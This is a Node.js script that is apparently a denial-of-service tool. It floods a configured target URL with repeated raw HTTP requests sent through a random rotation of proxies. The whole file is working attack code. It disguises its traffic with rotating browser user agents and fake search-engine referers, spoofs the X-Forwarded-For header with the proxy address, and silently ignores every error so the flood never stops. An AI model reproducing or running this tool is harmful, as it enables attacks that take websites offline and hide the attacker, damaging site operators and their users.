const event = require('events');
const fs = require('fs');
const url = require('url');
const net = require('net');

const config = require('../temp.json');

const proxies = fs.readFileSync(`${__dirname}/../${config.proxylist}`, 'utf-8').match(/\S+/g);

const emitter = new event();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.141 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.89 Safari/537.36"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.baidu.com/",
    "https://www.yandex.com/",
    "https://www.twitch.tv/",
    "https://www.youtube.com/",
    "https://web.whatsapp.com/",
    "https://github.com/"
];

var main = setInterval(() => {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    var agent = agents[Math.floor(Math.random() * agents.length)];
    var referer = referers[Math.floor(Math.random() * referers.length)];

    var proxysplit = proxy.split(':');

    var s = net.Socket();
    s.connect(proxysplit[1], proxysplit[0]);
    s.setTimeout(config.timeout * 1000);

    //upgraded for more performance

    var payload = `${config.method} ${config.url} HTTP/1.1\r\n`
    payload += `Host: ${url.parse(config.url).host}\r\n`
    payload += `Referer: ${referer}\r\n`
    payload += `Accept: */*\r\n`
    payload += `Upgrade-Insecure-Requests: 1\r\n`
    payload += `User-Agent: ${agent}\r\n`
    payload += `X-Forwarded-For: ${proxy}\r\n`
    payload += `X-Forwarded-Proto: https\r\n`
    payload += `Connection: Keep-Alive\r\n\r\n`

    for (var i = 0; i < config.reqpproxy; i++) {
        s.write(payload);
    }
})

setTimeout(() => clearInterval(main), config.time * 1000);

process.on('uncaughtException', function (err) { });
process.on('unhandledRejection', function (err) { });